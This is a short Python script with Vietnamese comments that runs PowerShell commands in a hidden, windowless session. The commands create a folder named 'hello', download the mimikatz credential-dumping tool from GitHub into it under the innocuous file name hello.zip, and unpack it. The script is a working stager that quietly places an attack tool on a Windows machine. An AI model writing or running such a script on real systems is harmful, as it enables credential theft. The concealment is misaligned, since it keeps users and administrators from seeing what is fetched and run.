import subprocess

COMMANDS = [
    r'mkdir C:\hello',
    r'curl.exe -L https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -o C:\hello\hello.zip',
    r'Expand-Archive -Path "C:/hello/hello.zip" -DestinationPath "C:/hello/unzipped"',
]

def run_powershell(command: str) -> int:
    kwargs = {"capture_output": True, "text": True}
    
    # CREATE_NO_WINDOW chỉ dùng trên Windows
    import platform
    if platform.system() == "Windows":
        kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW

    result = subprocess.run(
        ["powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", command],
        **kwargs
    ) 
    return result.returncode


if __name__ == "__main__":
    for cmd in COMMANDS:
        if run_powershell(cmd) != 0:
            print("Dừng lại do lỗi.")
            break